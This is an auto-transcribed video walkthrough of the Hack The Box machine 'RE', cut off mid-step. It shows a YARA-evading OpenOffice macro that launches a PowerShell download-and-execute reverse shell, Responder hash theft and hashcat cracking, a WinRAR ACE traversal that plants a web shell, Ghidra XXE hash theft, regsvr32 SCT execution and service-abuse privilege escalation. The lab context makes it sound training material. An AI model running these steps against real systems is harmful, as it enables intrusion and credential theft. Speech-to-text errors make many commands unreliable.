 what's going on YouTube this is if Zack and we're gonna be doing our e1 box where you hacked the machine of a reverse engineer it starts off by sending malicious OpenOffice document that bypasses all their your own rules and gives you a shell on the box as them then you have to escalate privileges to that of a web service by exploiting a vulnerability and when rar and finally you have to poison a deidre project file with an XML ND injection vulnerability and steal someone's password so with all that being said let's just jump in as always begin with a and maps or - SC for default scripts as V enumerate versions Oh a output off format spin the end map directory and call it R E and then finally the IP address which is 10 10 10 144 can take some time to run so I've already ran it looking at the results we have just two ports open the first one being HTTP on port 80 and his banner tells us it's a is version 10 which is most likely a Windows Server 2016 box we have a few HTTP and map scripts running the important one probably being HTTP - title telling us the pages title is visit re blog HT B so we have potential host name leaked right there and then finally we have SMB open no scripts really running no surprise there and at the very bottom we have a clock skew of 51 minutes so if we do any type of time-sensitive attack like Kerberos we should probably sync of times because troubleshooting anything that fails because of time is just horrendous we also have SMB signing is enabled but not required and in order to pull this off we need multiple boxes because he can't do ntlm relaying with a single box so we're just gonna ignore that for now that being said let's just go over to the page and see what's at 10 10 10 144 so going there we just see more sites coming soon current site is located at Horry blog HDB and then our box doesn't know how to get there so let's go create the hosts entry for this box so going into Etsy host we can just add 10 10 10 144 and type early blog HT B and then go back to Firefox if you try to go to blowing done HDB your dns is going to be cached so what you'll have to do is edit preferences and then go to clear and clear history and then check make sure the bottom two boxes are checked click clear now and then when you go to re-blog HDB it will suddenly it should have resolved let's go clear everything yes and check this make sure we don't have a typo or a blog HT be our blog HT b HT p oh my god is getting a few rating re-blog HT b control shift are there we go sometimes dealing with dns cache is just god-awful but we get a page checking out the source code to see what this page is created in is it WordPress Joomla whatnot we see this Jekyll tag and Jekyll is a static site creator so chances are we don't have any like attacks against this website because not accepting user input so the main thing I'm gonna be looking at is just what the pages are we have this about page and this is just a blog where updates will be at nothing too interesting there we have a potential user name malware at reh TB at the bottom and then I'm also going to take note of the bottom post automation and accounts our analysis box and then go to the RSS feed to see if the feed is giving us anything different it did not like me pasting that in so let's just go to the very bottom and we'll see the last post here is the same as the last person on the website so the feed isn't really telling us anything so now we have to go through and read each blog post I'll just highlight the key things in each one so let's go over to cherry tree control and to create a new node we'll call it our e notes and man I really gotta fix my speaker the next thing we need to do is create a node we'll call this one pages I guess and then going here we have this automation accounts on analysis box first the key thing here being it's telling you there's a automated process to run malware and you should you always use loop privileged accounts on your Windows host so the malware can't access your machine well it's gonna suck if someone pops it and finds a way to prove ask the next blog post is talking about a tool called Deidre and it was just released by the NSA for malware analysis telling you where to download it we get another potential user named Kenny and I think we missed a user name on this automation accounts Coby so we can go back here and create user names Kenny Coby malware and always useful to have the names if we have to do like credential spraying or something so let's look at Deidre exploit and this one's just talking about it opening a port Java debug board I believe so not too interesting it's saying to run it on localhost analyzing document macros with Yara and it's pointing to a blog post by the machine creators your xdf just talking about Yara and yura essentially is a good way to do a bunch of searching easily so I'm trying to go down and look at some rules let's see I guess this will be good so it's a gamal file so I forget what llamo stands for but very human readable it's looking for strings and either the get strings or three of the functions so the get strings very easy to read no case means don't care about casing it case insensitive there's other tags so if you google like write your rules you can see all the tags here the keywords all no case wide etcetera so definitely check this out you just search like no case you can see no case means case and sensitive strings so definitely should look into writing your rules um we can put a note here pages automated malware running your rules and this blog post is also saying nothing else so let's go to classification and invoke obfuscation two different tools to create a bunch of obfuscation things should look into it I don't think I'll be going into them in this video as I want to do it other ways we have an ODS phishing attempts and this is just saying hey if you see any documents I get past the yellow rules that were created drop them in the malware Dropbox so now we've to go hunting for the malware Dropbox so I'm gonna do SMB map - H 10 10 10 144 - list open shares on this box and we get authentication error so I'm just gonna do you anonymous and we'll see what this says and I don't know why it decided it wanted to reverse the directory I was expecting it to only say like the open shares so something's going wrong with s and B map we do see malware Dropbox is set to read only but for some reason if we try to create a file test SMB client 10 10 10 yeah 10 10 10 144 and call this malware Dropbox just press and if the password do anonymous we can create files so SMB map is giving us a false positive and if we do a second dir eventually the file file gets deleted so we know something is happening something processed it and did it pretty quickly I'm gonna just troubleshoot SMB map real quick github SMB man let's download the absolute latest version so get clone CD S&B map python 3 s mb map - h 10 10 10 144 and we'll do a user name anonymous again and that is the output i'm expecting it's still saying read-only so let's go into this grep def SMB map i just want to look at all the functions probably want to look into get cheers the SMB mapped up I get shares and we see this variable Ken right so let's see what this is doing we got a try right here except this looks like a good debug message that's commented out so right here it's trying to create a directory and if it can then it probably sets this can right to true if it can't it fails and doesn't create one and then Ken right doesn't get set to true so it knows it's not writable so let's run this again and we just get a non descript error message I'm going to print e run this again we get access denied so this may be an impacted thing so I'm gonna get the latest version of impact impact it github down with this get clone what modules is it using how's it pull it from in packet so go in here and let's actually move in pack it up one directory and pack it and then sepia and pack it to SMB map and we'll also do examples so Python will by default load out of a current working directory first I believe so this will we'll just run SMB map with the latest version of in packet but that's what I'm trying to do here and still getting access denied so impact it let's just make sure we're running it so one thing I always do to see if I am running is we can go into in packet examples logger be impacted examples logger and we'll just put a print statement here real quick if Zack was here and this prints we know we loaded the library so looks like there is potentially some bug of impact it saying a anonymous shares not read right don't know exactly what that is but hopefully the troubleshooting helped sorry we can't resolve that but let's just move on and go into trying to figure out how to do this so we want to go in create a ODS file so the first step is googling what is an ODS file and we'll see ODS is open document and this is like open offices version of Excel so let's go install LibreOffice so apt install LibreOffice and this will probably take a little while to install so I'm just gonna pause the video cuz it's guy download about a gigabyte and then install it but once this gets installed we'll start creating the macro now then is installed we can just execute LibreOffice to open it and then to create a ODS file we want to do calc spreadsheet and we can confirm this as ODS by doing file save as and we see ODS and I'm hyping on that because the blog post says ODS phishing attempts so it's ding an ODS file if you did a word document like ODT it's not gonna work it's configured to only work with ODS but to create a macro you get a tools organized macros and then select LibreOffice basic go to your document click new and then give it a name I'm gonna do run me doesn't have to be that can be anything you want and then you're greeted with this in Microsoft Office you just change this sub to be I think like autoload or onload or something to run on the startup OpenOffice is a little bit different we'll get to that in just a minute but to run a command we're just gonna use the command called a shell and we're gonna start off by doing the simplest thing possible and that is just pinging ourselves and the reason why I start with ping is because we want to make sure everything works and once we confirm we get code execution then we weaponize it if we stir it right off the bat and do something complicated we don't know exactly where it failed if this fails we know we have to do some serious obfuscation or something went horribly wrong so I just press ctrl s to save it and we'll save it in root htb boxes select our e we'll create the directory macros and we'll save it in here and we'll call this document ping - we'll just call it ping to DES and now in order to make it run on load we go to tools customized select this events tab in the top right and then hook top-middle I guess and then select open document and go to ping - D s and select your macro so you can see open document and it's running standard run Meade main so now when this document is opened it will run that so what we can do is start a TCP dump so TCP dump - I ton zero ICMP and then on our host we do SMB client for backslashes 10 10 10 1 10 no 144 and then two backslashes the foul the share name which i think is malware Dropbox hit enter for default authentication and we can just um LCD I think Macker feet of L PWD oh I don't know LCD I think changes the local CD I was only in the re directory and we created the directory macros so that's why I had entered that so I just do LCD doesn't say anything okay but ping ODS and we see it was uploaded and hopefully in a few seconds we will get a ping from that box there we go so we have confirmed we have code execution so let's go and make a document a little bit more complicated and say it's gonna do cm d /c ping and I saved it I'm just always going to go to this document and save it as well sometimes things are picky which window you save it in so save this one and all we did was add CMD / C which is a common flag for running malware and a lot of things will detect that so if we don't get a ping back we'll know we can't do that we have to up you skate a little bit and I'm not saying a ping back so let's obfuscate it so we can say please subscribe is equal to CM and then we can say to my is equal to d / c and then channel is equal to ping - n 110 1014 - and the shell would just be please subscribe to my channel so all we did here was break up the string so now if something's just searching for CMD and macros it won't see it because we broke it up between two variables so save this and then we put this in I didn't save it in the sheet okay it doesn't matter you can save them in the macro but we get a ping back so we know that works so let's try running PowerShell so PowerShell save save put and we get a call back again so now let's do PowerShell encoded command so before we do in co2 command we have to create the base 64 and PowerShell expects it in utf-16 little-endian so anything we do we have to make sure that's encoded in that so ping - n 110 1014 - and if you xxd this you can see what the heck's looks like this is not utf-16 if we do icon - t for target utf-16 le x XD again you can see every character is taking two bytes which is 16-bit so let's now base 64 - w0 and copy this and we can say powershell - encoded command paste so save this save and we will upload it and it doesn't look like we are getting a hit back so let's further obfuscate this by splitting the string up so we'll say channel is equal to powers and we'll call this and support is equal to this and we'll split that up here and we'll call this on patreon is equal to this so let's add the new variables and support me on patreon so save this save it here to make sure put the file and hopefully we get a ping if not we have to go troubleshoot exactly why but nope we do so now we have a way to run PowerShell encoded commands and at the end of the video we're going to do a different way we're going to go to Lal bends and execute it without using c mb / c but for now we'll just continue down this path so the final step is go back to that ping and we're going to change this to be IX new object net web client download string HTTP 10 10 14 to slash evil ps1 okay that looks good get this base64 copy go here paste it in save save and we have to create a www rectory and then we got a copy a file in here so I'm going to copy user share nishang doesn't exist app to install nishang CP user share the Shang shells invoke powershell tcp ps1 into dub-dub-dub let's edit this actually let's move it first to be evil ps1 and then edit it so this is just a PowerShell reverse shell so we'll grab the example for reverse shell put it at the bottom and then we will put our IP address which is 10 1014 - and then the port would do 9001 we're gonna do Python 3 - mm hg p server on port 80 and then here we can do n CL v NP 9001 and I forgot to rename the document away from ping but oh well we just upload it and we see almost immediately we get a reverse shell so we can do Who am I to see we are the loop user and generally the very first thing I do when I hop on a Windows box as a user is I want to get his password as soon as possible because if I lose the shell having to pass what helps me keep the shell so to do this I'm gonna run responder on my box with I ton 0 and we have to get rid of this we don't need that anymore so let's control C of that and rerun it so now we have a tool that's listening on port 445 SMB and whenever anyone connects it's going to try to dump the hash of that user so on a reverse shell we can just do get content backslash backslash 10 1014 to back slash please subscribe all that's gonna do is try to connect to the share and when it does we get the hash so we can copy this hash and send it over into a crack in to try to crack it so let's do SSH kraken and then CD hash cat ashes we'll call this our e dot n t om paste and actually I want to name this or ntlm v2 I know we can do dot slash hash cat example hashes less and search for ntlm v2 probably capital ntlm and we see the mode is 5,600 so we can do dot slash hash cat - m 5,600 hashes are en TL m v2 and then my word list can be up to where list rock you text so while that's going we can then continue our enumeration of this box and let's run wind peas so CP opted not that privilege escalation awesome script sweet and this is just on github so you can just go up yeah Google this and you'll find it let's run the bat version and we just want this so copy this here it's in our dub-dub-dub directory we can kill responder start a web server backup and do ix new object net web client download string HTTP 10 10 14 to slash when peas dot that so see if this execute do not want to so let's just do CD backslash users loop and we'll go into his music directory and download this file so W get - Oh route file when peas dot that and this will be at HTTP 10 10 14 - when peas dot that dir so cm d /c when peas dot that does this work am I not going to get the output of this command I'm just gonna let this run for a little bit look back at the crack in and it actually did not crack see him at this point specify a rule file so - our rules inside Pro passwords bro and let that go but not actually sure if that executed I'll just give this like five or ten minutes and we'll see if we come back with output it's now finished running it took probably about seven minutes and didn't give any out them until it was done so we can just do a search for a CMD / c figure at the very top where it began writing and start looking at the output the first thing we see is just a bunch of information about the OS we can see it is Windows Server 2000 19 so I was wrong and beginning of the video when I thought it was 2016 we see the install date was 313 at around 5:30 p.m. but the system booted on January 5th not to much useful information there we can see hot fixes we didn't enumerate any so either there's no patches installed or we just don't have mission to view them date/time audit ref lapse UAC we can see UAC is enabled there's no registered AV PowerShell settings we can see transcript module and script block logging definitely good things to take note of for like upset checks mounted discs C and D environment data it's a bunch of information that path installed software this is also handy we can see Java is installed which is requirement for G draw a notepad plus plus P zip sysinternals we can copy those that's interesting and we also have WinRAR so go here control-shift-n de create a new node call their software and paste this in and we also want win raw things to keep mind running processes nothing too interesting there things that run it stirred up always elevated IP information and that's that output firewall information up tables the host file dns Wi-Fi current user information so we can see when he wet he last set his password 327 at around 7:30 a.m. but he had a login at January 5th let's see user information privileges so looking at the tokens we don't have the SE impersonate so we couldn't do juicy potato even if it was um possible in Windows 2000 19 which I'm fairly certain it is it's just um not public or anything I wouldn't depend on 2019 preventing you from that exploit there's a few users we have cam Coby and Luke so if we go here we got cam Coby Luke cam Coby Luke and if we wanted to we can also do net user for each of those users so we'll do it at the end administrative groups currently logged-in users serve as vulnerabilities that's just giving information DLL hijacking Windows credentials so this is the deep happy master keys on engagements I'd always recommend downloading these because the there is a domain backup key so once you get that you can decrypt them all and if you go to if sector ox and type like EFS it is helpline this will show you how to use these keys to decrypt EFS files with just a user password so definitely keep that in mind always download any encrypted blob you can let's see files and registries that may contain credentials and that's it so the one thing we want to do is look at some users so we can do net user cam and it's my shell-bed my show may be dead start this cup SMB client we got to go into macros SMB client ten ten fourteen two and then the password was a nut password share was malware Dropbox and it's ten ten ten 144 put pinged is uploaded I'm gonna get that call back there we go and we got the shell back okay so we're gonna do net user Luke and we see password last set here I'll just copy this whole line copy go here paste we can do Koby copy paste and he is and remote management use in administrators cam and password last set here not any interesting groups so the user we want to get to is probably Coby so keep that in mind at this point we're kind of stuck we could try to escalate to the I is user so to do that we go into i net pub and then dub-dub-dub root dir and try to go into each of these websites I do see an extra thing we see blog IP and our e so if we do dir and blog we can't even do it dir IP can't dir II can't but chances are there is a re HDB that goes to a different place so let's edit our hosts file if I could type correctly and we can say re htb save this and go to http re h TB and just says please check back soon for updates if we view the source it's talking about uploading stuff and Diedre so exe should be at project root directory structures look something like this so if we go back to a shell I'm guessing the GIJoe probably wants to go into project drop but we can't access that so let's try to look at exactly how the automation works for us actually executing this office document so I'm going to go into CD users loop and we're going to take a look at the directories here we do dir desktop there is that user dot txt if we do dir documents we have a few files so if we type ODS yarra these are the bad strings so here's some good examples so if it contains any two of these parish shell variables then it's gonna be blocked so PowerShell new object net web client whatever - II so this is why the encoded command didn't work so PowerShell and - II then it flagged we see no case wide and ASCII no case case insensitive ASCII just being taxed and wide so it's doing both UTF and ASCII I believe or utf-16 little-endian but yeah so that's how the Yara's work so let's go and check out process samples dot ps1 I got a bunch of stuff here I'm going to copy it to my local box so I have syntax highlighting so let's see starts here copy we can just do VI process sample ps1 paste it in we don't have powershell syntax highlighting wonder if i trick it and just say it's python what's gonna happen yeah better than nothing so process directory see : users documents malware process follows to analyze ODS Yara executable in the rules so we see it's moving the file into process directory getting child item copying it this is where it's checking the yarra see we're trying to figure out how it's putting things in the project Dropbox so invoke item kill we have it using potentially when rar and let's see process to temp so let's see what is processed der mal what process so based around this being something with winrar and this being super unique in terms of hack the box I went in researched a bunch of vulnerabilities and WinRAR and one of them that popped out was the ace for nobility by checkpoint research and if we click on this and then click here it talks about a vulnerability in WinRAR which is kind of like a zip slim type vulnerability that allows you to place a file and unintended locations so we're going to do this and place a file in a WWE so you can read this whole thing too interesting what's happening or you can just download the script so I think it's some evil roar gen right here so we can just go to a new pain CD opt get clone paste that CD it evil winrar gen I'm going to do pip 3 or let's look at what it is is it Python 2 or 3 it looks like it is 3 so pip 3 installed - our requirements text and then we can execute it to see what we want to do so - oh is the file name - G is good file and - E is bad file so I'm going to copy user share we gotta get an ASP X she'll share is 10 see here at the install Tennessee trying to think of a good aspx shell we have payload all the things so opted payload all the things find grep aspx and I'm doing aspx because it is Windows so chance of Windows executing this is probably the highest at doing something like PHP probably doesn't make sense because they need something extra to be installed so we can see d dot here NCP Shelley aspx into opt evil WinRAR and we can just do Python 3 look at the arguments again - Oh Shelley ra r - e is going to be shell dot aspx - G for a good file as their requirements text and - P for the path C colon backslash what is it C colon backslash I net pub dub-dub-dub route are e this is the path we want copy and we'll just paste it so we successfully created that archive so we can just copy it go and move it to HT B boxes are e dub dub dub rename this pain to evil rar go back here do we have a dub dub dub save what we do so we can go back into users luke documents and we can go CD malware process and try to download this so we can do w get - shell shell raw and will download from HTTP 10 10 14 to show aria so we can download this and notice it's gone so if we go back to a web browser or EHD b / L dot aspx we get application cannot be found so let's try copying it to a different directory it being gone means well something happened what's in this ODS directory try it here dir we can see it give it a few more seconds and it's gone refresh the page and we still can't see it so let's go back to evil large N and look at a command to see if we screwed anything up LS requirements dot txt so all the files are there so it's a valid archive let's go and examine exactly what we created so CD dub dub dub x XD shell area we can do - c 32 to change the columns to 32 which is a bit longer and then just less this and look for where our payload is so I can just search for W and we see it here so C colon backslash I net pub dub-dub-dub root / re shell aspx so we probably have to have a trailing slash on that so let's create this again except put re / CP shell array are to htb boxes are a dub dub dub and go back to a netcat shell and we can do W get what we did let's do the malware process first W get - OH Shelley are 10 1014 to shell re are so we'll copy this to the clipboard dir files gone still can't be found let's go to the ODS download it wait for this file to disappear come on this time is gonna be gone OOP there we go finally gone refresh that's a different error what we gained before shell - so server error can't be found like that and then shell what is it different so maybe we have a bad shell I don't know why it's a diff for that is absolutely bizarre so let's go back bi shell dot aspx should be good so let's go back to a theory before and put a non malicious file so V test dot HTML and we'll just call this please subscribe to epic okay let's make sure test dot HTML doesn't already exist so we'll just paste this in and we get a 404 which is fine so let's go generate another malicious archive and this time the evil file is going to be testy ml and we got to put the trailing slash okay CP shell our AR - where is HT be boxes whatever and we can go back here to a ver cell and do the W git command let's just copy it paste okay so validated we can do that so let's try this evil roar again and I'm going to chmod 777 on shell dot s PX because maybe it amazed missions and I think for aspx miles we executed they have to have that bit set so let's test this for real quick and because I found may exist on the server let's rename it to CMD dot aspx because why not so let's do this CMDA SPX and the real reason why I renamed it is just because I didn't want it to like fail to copy to the server because it already exists or something weird like that so that looks fine copy this to dub dub dub go back here and we will paste this command wait for this disappear come on and you're gone right yes so now CMD aspx 404 not found so it's probably this web shell so maybe we should try something else because we validate it we can copy files there we just can't use this web shell for whatever reason so I think the logical thing to do would be to try like ASP so opt payload all the things find grep aspx CD upload insecure files extension ASP and we can do CP shell ASP to opt evil on this same command except shell dot ASP and I'm just going to save this directly to root HT B boxes are e dub dub dub to save us a step so W get copy paste and maybe wait okay I did CMB is px to show ASP yeah it's gone but we can't access it so at this point it's time to change up the shell I'm going to search te NNC github and this is another collection of a lot of good shells the web shell directory so we can go a not get clone 10c web shell CD web she'll find grep aspx backslash dot aspx oh man there's so many yeah there is definitely a lot of these shells let's do this fuzz DB so we'll copy this to dot dot slash evil WinRAR and we will run it here so this will be CMD dot aspx is the file name and should be good was my previous one I did okay shoutout ASP so we just did CMB dot aspx let's rename this because we've already used this name once please work aspx because I'm grasping at straws here why I'm game is for force please work actually chmod seven seven seven please work trying everything possible please work okay so it copied it there go to a shell W get it go back here please work aspx I'll still exist it's gone and hey we got a shell so apparently it just doesn't like that one web show we were using which sucks but now we have a shell so if we do Who am I we can see where is a pool back /re so now the I is user so if we do a reverse shell again so let's go here and get out of my Kraken we can call this one Luke and this one will be is NCL VMP 9001 and let's see we just got a call evil dot ps1 so cmd.exe /c powershell go ahead the macro still save title we'll just do i x IX new object net web client download string HTTP 10 10 14 to evoke PS 1 from that get a shell Who am I and we're the REE user now if you did run the wind peas again there's probably a service you can edit to prim s --k but that was an unintended path which we'll cover at the end of the video and we'll also cover getting a shell at the end of the video as well be an unintended way using zips lip but we're just gonna follow the intended path right now and now we can write to all the directories so we can write to this proj drop and do dir so we echo test here we can see it's created and then it also disappears so if we go back and just look at our eh DB and look at these notes it's talking about bloating a Deidre thing for analysis and it wants it to be in a zip and it's telling you the structure and if you went to key drill on github and search through everything on the issues issues tab you can do is closed search for like security you can see security related issues you can search by like RCE and see exact RCE things possible and function bit Explorer plug-in there's the one the blog post was talking about on March 7th the JD WP web port there's also like XML and the injection one so that's the one we're gonna be starting with so project handling is susceptible to xxe and if you read through this it's pretty simple it's just doing a XX e file in a jido file the example is doing it in test dot wrap PYP so we're just gonna put this here and it's gonna be the same exact logic we did with the previous one I'm just doing a callback to a responder server and getting it to give up a hash of whoever's running this so let's try this so on our box we just have to run deidre so do you have that downloaded installed and we'll just create a new project and then put that XML any injection in there so let's do file new project non-shared or the name will be boxes or e let's create a directory here make turkey draw deidre and project name will be please subscribe so click finish we LSG draw we have the directory so we can close it so we already created everything we need and then they went into the dot rectory and edit project PRP and put the XML any injection string in here so let's go to payload all the things and look for X X e to get a payload so CD upped payload all the things fine dot grep i XX e and we will do let's see what is this plus dot slash that I'm just going to Google one real quick x XE LF I example I want one close to this as possible without having to type it yeah or just type it that's not much so it's good just view image okay so let's see that lines the same doctype ka this piece doesn't matter entity percent DTD system and we're going to say it's at ten ten fourteen to please subscribe [Music] ok % d TD okay and close that doctype so what we did was put these three lines in there are four lines okay and now it wants it to be zipped so let's maximize is again zip I think it's file name and then files so we'll do is it please subscribe zip star okay so now we can move this to the dub dub dub directory go back to a show undo responder - I tun 0 it's going to error saying can't listen on port 80 because we have a Python server there that's fine this is only using 4 4 5 so that doesn't matter oh we got good at is don't we get - oh please subscribe zip HTTP 10 10 14 - please subscribe dot zip ok downloaded and we didn't get anything so what I'm going to do is we're going to go back and edit this actually go back here first or e so exe should look something like this okay that looks fine I was just making sure I didn't want make a directory beforehand and it doesn't look like it does unless I need to create a like please subscribe eh see to trigger something but I don't think that's the case B Project PRP oh I have two backslashes here should only be one I don't think that's the case that I'll but it doesn't take longer to test it so let's remove it first zip it again and then move please subscribe zip to dub dub dub and do this w git command again and while that goes let's just edit this to go back to HTTP and what this is going to do is validate it's working because the example is saying it pulls from a web server so get it as close to the PRC as possible see [Music] when I first created that zip what director was I in Fiji draw okay that was in the right directory the one I just uploaded I'm definitely in the wrong directory so be please subscribe our EP project dot PRP okay zip zip please subscribe what's that dub dub dub I screwed a command up somewhere Marvis Lee but loosely cover covered so move this to dot slash dub dub dub W get if the xxe works we should get a hit for two things er it's gone but we did not so if we look at please subscribe our EP and project dot PRP we should have just got a file called please subscribe and we clearly did not so I'm just going to try it few more times so this time I'm just gonna get rid of HTTP and we'll do a UNC path with forward slashes if you remember the last time we did the UNC path I had it as back slashes and I had two backslashes here so actually I'm going to try it with back slashes first to see if that's it I'm guessing if I do it back slashes maybe I need four and two here or something weird but let's just validate this okay and we don't have a zip here so we can zip please subscribe and we can move this dude dub dub dub go back here and do the W get thing go here and nothing yeah yeah it's gone so the next step let's do this with forward slashes so forward slash there to here okay then we zip this I'm just gonna put this in one line please subscribe zip to dot slash dub dub dub okay and we can do this going to the next thing we got it but no hashes there's something weird is going on let's go end dub dub unzip let's make the temp CP please subscribe to temp and we'll go in there unzip and I found out the issue we're not putting all the files so we need a dash or a flag in a zip command that was stupid so let's go back to key draw go back to that zip command add the - our flag and that looks better it's adding a lot more things to the zip so if we W get this go here still nothing let's just redo everything so we messed up royally so let's redo this but I want to copy that project ppl so key draw please subscribe CP project PRP copied here okay Pedro is empty opt Chiara e to run file new project yes there please sub scribe finish new folder test okay should be saved CD Diedre please forgot that rap CP the project okay zip - are please subscribe zip on everything okay MV this dude dub dub dub and we'll do this w get command and pray this works there we go so now we have another hash so maybe just fooling around with the file so much I corrupted it somehow but we have this so we can do the same thing we did before SSH into the Kraken go to CD hash cat V hashes backslash re dot until MB to paste Kobe's hash in and then dot slash hash cat the ntlm version to format which is 5600 hashes re NT LM p2 and then opt word list rock you text CD hash cap there we go and looking at the results we recovered one password and that password is championship 2005 so we can copy this and we have to go back to a shell to use it so we could try and do PS Zach with him because he is an admin so we do which PS exact PI locate PS exact PI and we can run that so opt I will do user shared doc Python 3 and packet examples PS exact I Coby at 10 10 10 144 place a password of championship whatever in and we can't because we don't have mission to open SBC manager however we can go back within PowerShell and just manually create a token so we're going to create a secure string so define the path variable and then say convert to secure a string and the password I think was championship 2005 let's go back here championship 2005 okay and then - as plain - force so pass is a secure string cred is equal to new object system automation management PS credential dot backslash Coby and pass ok I type out something red equals new object system dot automation manage mint dot PS credential so what that was right let's copy paste google paste how do I have it wrong system management automation yeah that's it probably have a type or somewhere so I'll just paste this dot backslash Kobe pass yeah how do weird type or summer or maybe it's case sensitive I don't know but now we have a credential object and we can do invoke command computer will do re HDB - credential cred - gripped block and this is the brackets IX new object net web client download string HTTP 10 10 14 to evoke ps1 so copy that close that I think that's good we can close that responder NCL vnp 9001 and let's see failed let's do invoke command - computer r e so powershell remoting always likes correct toast names and hosting this box may just be re yep there we go Who am I we're Coby CD users administrator CD backslash users CD administrator desktop and we can now get route text so that is the box doing it the intended way and now let's do the unintended rail I know that was a super sloppy cut but the last piece of the video was corrupted and I'm just noticing it now like three weeks later did the recording on January 5th and today is January 27 so with that being said the two pieces I want to show is using reg server 32 and that OpenOffice macro so we can get it working with PowerShell without touching cmd.exe and then the second piece I want to show is doing a different print ask because the eye is user on the server can modify the USO SVC which I think is the windows update Orchestrator service doesn't matter what service it is we can modify to make it do a bidding so let's get into the macro I'm gonna have to open up my final browser so let's open a folder HDB boxes or is it our e macros and pincode es and I'm also gonna go and Google something I have reverted this box because it was several weeks so this please worked out aspx doesn't exist right now so what I want to do is Google reg SVR 32 SCT file because I know from experience that this file or this binary can load code and the form of SCT files is just something I had known previously so knowing that I can just take this little payload and weaponize it so let's grab this and we will go into a dub dub dub directory and look at it so I'm just going to call this evil SCT and we will paste it and all we have to do is call reg SVR 32 with these arguments and then it should execute and it's just doing running calc see we want it to run PowerShell so we can do PowerShell and - encoded command and enter SCT file I believe we have that encoded command we want to run so let's go to macros edit ping dot ODS standard run me copy the base64 and this base64 is literally just an IEX call so we can echo this and base64 - d you can see IX new object and it's going to download and execute evil dot ps1 so that's all that's going to do we can get rid of all these comments because they aren't needed and I'm just going to cut this so we can grab this easily in our clipboard and we're gonna go back to this and the variable we want is just that and we can delete everything and we can even delete this and we change this URL to be ten ten fourteen to slash evil SCT and then we want to run shell and only do please subscribe so that changed a macro up quite a bit so if we save this exit it and we have to start a web server so I'm gonna do Python M we'll do Python 3 - mm HD p dot server on port 80 and we want to do n CL v NP at 9001 and the last thing we want to do is upload the Matt rel I'm going to go into the macro thing SMB client was it 10 10 oh I have a thing of this so our eh TB and malware underscore Dropbox I think and I do a dir and we can just put pink ODS and we should see it now grab Evo dot SCT then evil dot ps1 so there we go evil SCT Evo ps1 code execution so this allowed us to do this without even having to worry about any of those yara rules so the next piece we want is to upload that aspx and that was the simple our AR file because right now if we do who am i will loop do mi / all we're not a part of the NT services so for this one piece of the exploit it is key we're a member of NT services let's see the next thing we want is users luke documents and malware Dropbox I think so W get - Oh HTTP 10 1014 to shell rar and crap shell raw HTTP 10 1014 to shell raw and hopefully the next time I get this repair shell I remembered to use RL rap so I can have that left and right key because it's really annoying not having that so do a dir I don't see anything if we go to please subscribe back aspx it's not there maybe it was in malware process let's just go up so I can copy copy paste dir it's gone and we're still getting 404 so maybe every euro wrong or we did something wrong malware Dropbox let's try this one more time maybe it was the ODS folder with that double you get again wait for this to disappear it's gone refresh there we go so the ODS folder is where it was so now we have to do the reverse shell again and this will put us as the dub-dub-dub user so let's exit that and let's see you can probably just go back and edit this macro to copy it actually it's an S et file so cat dub dub dub evil dot SCT and we just want to run this PowerShell command so cm d /c powershell and paste that alright that should work and c lv NP 9001 run and that did not oh I don't have in Karam command coded command there we go so if we do Who am I we're iis and if we do Who am I slash all unlike the last time we have a lot more things and the key thing in this I think is built-in iis users I have no idea nto xxx service this is the key group that is able to modify the service we want so let's go into a place we can write so we can probably write and user public documents echo test test dir so we can write in this folder so we're going to drop a few executables I want to grab the wind peas exe and for this I'm going to compile everything myself so let's switch over to Windows so we have Visual Studio to compile now that we're on Windows I'm going to pull up Chrome and we're going to download two different professed chackers the first one I'm gonna do is show up up github and this is going to just be the standard like dotnet version a powerup so let's open a command prompt go into desktop github and clone this repository and the other one I want to do is wind peas and I always recommend running multiple especially when there's a new one coming out because there may be bugs so right now we're working on a bug to fix some missing writable service right now it is discovering it but it's outputting a bit too much information but before this video it wasn't discovering this at all so that's why I always recommend running multiple things because there are bugs and free tools and if you run too you can find those bugs pretty easily and report them to get them fixed so hopefully one day we'll just have one good tool but right now recommend running multiple so we go in this folder and we go open it to compile so when exe and I'm gonna show you why I hate just pulling tools and compiler tools and running them mainly I always recommend when it comes to net it is compiling yourself because if you have an error which will have I think when I do show up up you can fix it easily so let's just I switch that to release and I can rebuild the solution it'll say it's probably building to the release folder so it built to release probably right here and I'm just gonna create a directory the infamous temp directory on a desktop and place that file there and now let's go and open show up well so if we open this whoops passport the Visual Studio file was and we compile this once it opens release rebuild solution so now we have to so bin release show up up basis here and actually before I do that let's I think I have to be administrator up and bash because I don't think this just has Python or do i I do so I'm gonna have to open bash exit there we go CD desktop CD temp and then python sham HTTP server and my IP address here is 135 so back on observer I can do curl I'll just do W get once let me do 1610 135 port 8000 sharp up dot exe hang 192 1610 135 connection refused I'm just gonna do this in bash it's gonna be funny when this works Mount see users upset desktop temp Python - a 3 - m HD v dot server ok yep networks it's funny that running bash on windows is working better than the command prompt but let's do when Pease WC as well let's rename this dot one to win PSD XE so now we have both those files so we can go up here do it W get 10 10 14 to start the server shut up Exe - oh Sh up up dot exe to download that and we can do the next one which is when P study XE to download that so we got two files if we execute show pop dot exe it doesn't give us any prompt we do show up Exe I think audit there's another flag you can do in this we don't get anything so sure pops not working at all we do have powerup I think on a computer so we could just copy this I never updated my thing cuz that's definitely not in my directory but I can copy that and we do ix new object net dot web client download string HTTP 10 1014 to our up dot exe 404 not found Oh power off dot ps1 my bad and I did not do RL rap let's do that real quick or I'll rap do I have it app install our L rap one of the habits I'm just not into is always using this program when doing window shells it makes life ten times easier come on process the triggers for the man page there we go so we can do I'll rap on that Matt cat command and then go back and just get that show again CD users public documents but now I have up-down left-right cell quality of life ten times better we were trying to IEX pull the power up so ten ten fourteen to our off ps1 we can get that and because I didn't put invoke all checks at the bottom of this if we look at power off ps1 doesn't run any commands it just loads a bunch of things so I just do invoke all checks this is a power up command it will run power up and this is pretty much everything that is in sharp up so we can see what sharp up would have said and the end of the video we will go back and troubleshoot sharp up it just helps a lot with having remote desktop so let's get system get remote desktop to the server and then we'll run show up up and see what a mess just displaying and then fix it now that it's done we can just go and scroll up and we see right away checking service permission shows that this is vulnerable we couldn't exploit this by just running this command before I do that I want to see what the bin path of the service is first because I think default powersploit behavior just has it creating the user John with a weak password so I just want to make sure I can reset this back to default in case power sploit doesn't do that for us or power up so I'm doing SC query USO SVC and that's right powershell over writes that SC write command it's got a weird alias so if you want to do this within a PowerShell reverse shell you have to do CMD / see when using SC so let's see that's not it very e^x know I hate that there's so many different ways to query a service in Windows there we go SC QC and we can get binary path so this is what that invoke service a brute abuse is overriding so if we whoops I won on my clipboard so invoke s we can 